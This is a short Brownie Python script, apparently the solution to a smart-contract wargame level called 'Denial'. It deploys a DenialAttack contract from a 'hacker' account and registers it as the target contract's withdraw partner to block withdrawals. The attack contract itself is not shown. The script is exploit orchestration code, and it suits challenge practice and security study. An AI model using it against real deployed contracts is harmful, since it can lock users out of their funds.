from brownie import accounts, config, interface, DenialAttack

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack = DenialAttack.deploy({'from': hacker})
    denial = interface.DenialInterface(target)
    denial.setWithdrawPartner(attack, {'from': hacker})
    print(f'Attack address: {attack.address}')

